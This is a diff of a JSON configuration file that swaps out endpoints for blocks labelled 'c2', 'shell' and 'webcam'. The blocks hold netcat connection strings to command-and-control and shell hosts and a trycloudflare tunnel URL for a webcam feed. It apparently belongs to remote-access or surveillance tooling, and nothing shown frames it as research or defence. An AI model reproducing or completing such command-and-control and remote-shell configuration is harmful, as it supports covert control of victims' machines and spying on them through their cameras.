@@ -1,18 +1,18 @@
 {
   "c2": {
-    "host": "sam-bow-suited-silent",
+    "host": "secondary-zum-physically-alumni",
     "port": "",
     "type": "tcp",
-    "connection_string": "nc sam-bow-suited-silent:"
+    "connection_string": "nc secondary-zum-physically-alumni:"
   },
   "shell": {
-    "host": "jamie-motors-contributed-autos",
+    "host": "wing-anxiety-proposed-happening",
     "port": "",
     "type": "tcp",
-    "connection_string": "nc jamie-motors-contributed-autos:"
+    "connection_string": "nc wing-anxiety-proposed-happening:"
   },
   "webcam": {
-    "url": "https://city-calm-motherboard-hiking.trycloudflare.com",
+    "url": "https://folding-simpson-anniversary-alpha.trycloudflare.com",
     "type": "http"
   }
 }
